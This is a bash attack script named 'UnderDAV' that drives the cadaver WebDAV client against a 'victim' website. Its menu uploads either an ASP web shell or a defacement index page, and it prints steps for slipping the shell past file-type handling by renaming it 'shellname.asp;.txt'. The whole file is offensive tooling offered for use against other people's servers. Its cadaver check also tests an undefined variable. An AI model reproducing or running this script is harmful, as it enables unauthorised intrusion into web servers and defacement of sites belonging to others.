#!/bin/bash
#
##############################
#  WebDAV Upload Remote      #
#   Script for helper you    #
#     get Cadaver and go !   #
#     By Jonatas FIL [NINJ4] #
##############################


# check if cadaver installation exists   
      if [ -d $find ]; then
      echo [*]:[cadaver]:installation found!;

else

   echo [x]:[warning]:this script require Cadaver installed to work ;
   echo [!]:[please wait]: Downloading from network... ;
   sleep 3
      apt-get install cadaver
fi

sleep 1
clear

echo "Welcome to WebDav Upload Shell !!"
sleep 2
clear

#welcome
sh_Principal () {


cat <<!
                 UnderDAV
           By Jonatas Fil [Ninj4]
    TheCybers Team / 0wnz / CTF-BR
#------------------------------------------#
# 1) - Upload shell [asp]                  #
# 2) - Upload Index Deface [htm,htm,txt]   #  
# e) - Exit                                #
#------------------------------------------#
!
	echo -n "Select Your Choice ? "
	read opcao
case $opcao in 
	1) sh_shell ;;
    2) sh_index ;; 
    e) sh_sair ;;

	*) echo "\"$opcao\" Invalid!"; sleep 2; sh_Principal ;;  
esac
}
#shell
sh_shell () {

   echo -n "Your Website victim: "
   read victim
   clear
   echo "Put your shell in the file folder and edit the script..."
   sleep 2
   clear
   echo "waiting for connection..."
   sleep 5
   clear
   echo "================================================="
   echo "Step for uploaded you shell: "
   echo "command: put shellname.txt"
   echo "command: copy shellname.txt shellname.asp;.txt"
   echo "and your shell is uploaded in /shellname.asp;.txt"
   echo "Use the command EXIT for exiting, more help: HELP"
   echo "================================================="
   cadaver $victim
   sleep 2
   exit
   clear
   sh_Principal

  
}

#deface
sh_index () {

   echo -n "Your Website victim: "
   read victim
   clear
   echo "Put your index in file folder and edit the script..."
   sleep 2
   clear
   echo "waiting for connection..."
   sleep 5
   clear
   echo "================================================="
   echo "Step for uploaded you index: "
   echo "command: put index.htm"
   echo "and your index.htm is uploaded in /index.htm"
   echo "Use the command EXIT for exiting, more help: HELP"
   echo "================================================="
   cadaver $victim
   sleep 2
   exit
   clear
   sh_Principal
  
}
#exit
sh_sair () {
   echo -e "Exiting..."
   sleep 2
clear
exit
}

sh_Principal
